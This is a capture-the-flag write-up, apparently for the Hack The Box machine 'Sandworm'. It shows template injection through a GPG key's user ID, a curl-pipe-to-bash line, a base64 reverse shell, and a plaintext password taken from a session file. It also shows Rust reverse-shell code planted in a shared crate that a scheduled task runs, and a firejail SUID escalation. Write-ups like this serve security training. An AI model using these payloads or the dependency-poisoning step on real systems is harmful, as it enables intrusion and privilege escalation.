# Sandworm

## Gaining Access

Nmap scan:

```
nmap -p- --min-rate 5000 10.129.34.16
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-20 09:54 +08
Warning: 10.129.34.16 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.34.16
Host is up (0.25s latency).
Not shown: 56079 closed tcp ports (conn-refused), 9453 filtered tcp ports (no-response)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```

We have to add `ssa.htb` to our `/etc/hosts` file to visit the HTTPS site.&#x20;

### Secret Spy Agency -> SSTI

The website promotes an agency for spies:

<figure><img src="../../.gitbook/assets/image (2087).png" alt=""><figcaption></figcaption></figure>

The contact page allows us to send messages that are encrypted with a key:

<figure><img src="../../.gitbook/assets/image (254).png" alt=""><figcaption></figcaption></figure>

If we check out their guide. we would find that the website allows us to view encrypt and decrypt messages using our own key:

<figure><img src="../../.gitbook/assets/image (1196).png" alt=""><figcaption></figcaption></figure>

At the bottom of the page, we can also see some indication of a user:

<figure><img src="../../.gitbook/assets/image (1132).png" alt=""><figcaption></figcaption></figure>

So we can import our own keys into the system, and encrypt our own messages. I don't think these messages are being used in any way or sent anywhere, so the decrypting and encrypting messages part is not that interesting.

The most interesting is the function verifying keys using a public key and signed text:

<figure><img src="../../.gitbook/assets/image (1542).png" alt=""><figcaption></figcaption></figure>

Since there is a user associated with the GPG key, we can try to generate one with a different UID:

```
$ gpg --quick-gen-key test123
This is a revocation certificate for the OpenPGP key:

pub   rsa3072 2023-06-20 [SC] [expires: 2025-06-19]
      31EA5FC83F24B3E99B87885ED6F62FD89D66C0B7
uid          test123
$ gpg --armor --export 31EA5FC83F24B3E99B87885ED6F62FD89D66C0B7
```

Afterwards, we can input some encrypted message to verify that it has been signed properly.&#x20;

```
$ echo 'hello' | gpg --clear-sign
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

hello
-----BEGIN PGP SIGNATURE-----

iQGzBAEBCgAdFiEEMepfyD8ks+mbh4he1vYv2J1mwLcFAmSRCtsACgkQ1vYv2J1m
```

Afterwards, we can take both texts and use the website to verify our signature:

<figure><img src="../../.gitbook/assets/image (1907).png" alt=""><figcaption></figcaption></figure>

When we click "Verify", it would show that it worked:

<figure><img src="../../.gitbook/assets/image (3644).png" alt=""><figcaption></figcaption></figure>

This website also seems to print out the username `test123` that I have supplied. This parameter might be unsanitised, and vulnerable to OS command injection or something. We can use the `--edit-key` flag to edit the UID we have specified in the key:

```
$ gpg --edit-key 31EA5FC83F24B3E99B87885ED6F62FD89D66C0B7
gpg (GnuPG) 2.2.40; Copyright (C) 2022 g10 Code GmbH
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Secret key is available.

sec  rsa3072/D6F62FD89D66C0B7
     created: 2023-06-20  expires: 2025-06-19  usage: SC  
     trust: ultimate      validity: ultimate
ssb  rsa3072/720739787DDB982F
     created: 2023-06-20  expires: never       usage: E   
[ultimate] (1). test123

gpg> adduid
Real name: ;id
Email address: 
Comment: 
You selected this USER-ID:
    ";id"

Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? O
```

I tried a few payloads for different vulnerabilities, and found that SSTI worked:

```
$ gpg --list-keys
pub   rsa3072 2023-06-20 [SC] [expires: 2025-06-19]
      31EA5FC83F24B3E99B87885ED6F62FD89D66C0B7
uid           [ultimate] {{7*7}}
uid           [ultimate] test123
sub   rsa3072 2023-06-20 [E]
```

<figure><img src="../../.gitbook/assets/image (2939).png" alt=""><figcaption></figcaption></figure>

A bit more testing revealed that `{{7*'7'}}` works as well:

<figure><img src="../../.gitbook/assets/image (1556).png" alt=""><figcaption></figcaption></figure>

I tested both Twig and Jinja2 payloads, and got RCE using this payload:

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

<figure><img src="../../.gitbook/assets/image (1448).png" alt=""><figcaption></figcaption></figure>

I tried to execute this, but it didn't work:

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('curl 10.10.14.3/shell.sh|bash').read() }}
```

What works is a `base64` encoded bash reverse shell command since the UID of the key cannot have `>` or `<` characters.&#x20;

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zLzQ0NDQgMD4mMSAK | base64 -d | bash').read() }}
```

<figure><img src="../../.gitbook/assets/image (596).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Silentobserver Creds

When trying to write some files, I kept getting this error:

{% code overflow="wrap" %}
```
atlas@sandworm:~/.ssh$ echo 'key' >> authorized_keys
<UKeJR102N+sZgwA/2RE+v kali@kali' >> authorized_keys
bash: authorized_keys: Read-only file system
```
{% endcode %}

Something is blocking us on the machine. There are some other users present on the machine:

```
atlas@sandworm:/home$ l
atlas/  silentobserver/
```

Viewing the user's directory reveals a `firejail` file:

```
atlas@sandworm:~/.config$ s -la
ls -la
total 12
drwxrwxr-x 4 atlas  atlas   4096 Jan 15 07:48 .
drwxr-xr-x 8 atlas  atlas   4096 Jun  7 13:44 ..
dr-------- 2 nobody nogroup   40 Jun 19 19:43 firejail
drwxrwxr-x 3 nobody atlas   4096 Jan 15 07:48 httpie
```

Firejail is a security sandbox which restricts a lot of features, thus explaining why we cannot create files. When looking at the files within this directory, we can find some credentials for the next user:

```
atlas@sandworm:~/.config/httpie/sessions/localhost_5000$ cat admin.json
cat admin.json
{
    "__meta__": {
        "about": "HTTPie session file",
        "help": "https://httpie.io/docs#sessions",
        "httpie": "2.6.0"
    },
    "auth": {
        "password": "quietLiketheWind22",
        "type": null,
        "username": "silentobserver"
```

With this, we can `ssh` into the next user and grab the user flag:

<figure><img src="../../.gitbook/assets/image (223).png" alt=""><figcaption></figcaption></figure>

### Tipnet + Cargo

I ran a `pspy64` on the machine to view the processes that were running, and found the `root` user was executing this weird binary:

```
2023/06/20 02:44:01 CMD: UID=0    PID=7420   | /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline                                                                                             
2023/06/20 02:44:01 CMD: UID=0    PID=7422   | /bin/sudo -u atlas /usr/bin/cargo run --offline 
2023/06/20 02:44:01 CMD: UID=0    PID=7424   | sleep 10 
2023/06/20 02:44:01 CMD: UID=0    PID=7423   | /bin/sh -c sleep 10 && /root/Cleanup/clean_c.sh
```

The source code for this application is in `/opt/tipnet/src/main.rs`.&#x20;

```rust
extern crate logger;
use sha2::{Digest, Sha256};
use chrono::prelude::*;
use mysql::*;
use mysql::prelude::*;
use std::fs;
use std::process::Command;
use std::io;

<TRUNCATED>
```

It's a pretty long file, but it does nothing of interest. I noticed that this uses an external library called `logger`, which is located in the same directory as `tipnet`.&#x20;

```
silentobserver@sandworm:/opt/crates/logger$ ls -la
total 40
drwxr-xr-x 5 atlas silentobserver  4096 May  4 17:08 .
drwxr-xr-x 3 root  atlas           4096 May  4 17:26 ..
-rw-r--r-- 1 atlas silentobserver 11644 May  4 17:11 Cargo.lock
-rw-r--r-- 1 atlas silentobserver   190 May  4 17:08 Cargo.toml
drwxrwxr-x 6 atlas silentobserver  4096 May  4 17:08 .git
-rw-rw-r-- 1 atlas silentobserver    20 May  4 17:08 .gitignore
drwxrwxr-x 2 atlas silentobserver  4096 May  4 17:12 src
drwxrwxr-x 3 atlas silentobserver  4096 May  4 17:08 target
```

The weird thing is, it seems that we are given write access over this directory. However, the `sudo` command runs `sudo -u atlas` before running the command, meaning that we don't get a `root` shell.&#x20;

I still did it anyways because there was literally nothing else I could so. Append this code at the top of the function in `lib.rs`.&#x20;

```rust
use std::process::Command;

    let command = "bash -i >& /dev/tcp/10.10.14.3/5555 0>&1";

    let output = Command::new("bash")
        .arg("-c")
        .arg(command)
        .output()
        .expect("works!");

    if output.status.success() {
        println!("pwn");
    } else {
        let stderr = String::from_utf8_lossy(&output.stderr);
        eprintln!("gg: {}", stderr);
    }
```

This would give us another reverse shell as `atlas`, but with a different group!

```
atlas@sandworm:/opt/tipnet$ id
uid=1000(atlas) gid=1000(atlas) groups=1000(atlas),1002(jailer)
```

Now we are part of the Jailer group.

### Firejail SUID

We now can run `firejail` as an SUID binary on the machine:

```
atlas@sandworm:/opt/tipnet$ ls -la /usr/local/bin/firejail
-rwsr-x--- 1 root jailer 1777952 Nov 29  2022 /usr/local/bin/firejail
```

There are `firejail` SUID binary exploits [online](https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25). Using this script, we can easily escalate privileges. Just run the script:

{% code overflow="wrap" %}
```
atlas@sandworm:/dev/shm$ ./suid.py 
You can now run 'firejail --join=10543' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.
```
{% endcode %}

Then in another shell:

<figure><img src="../../.gitbook/assets/image (2317).png" alt=""><figcaption></figcaption></figure>

Rooted!&#x20;
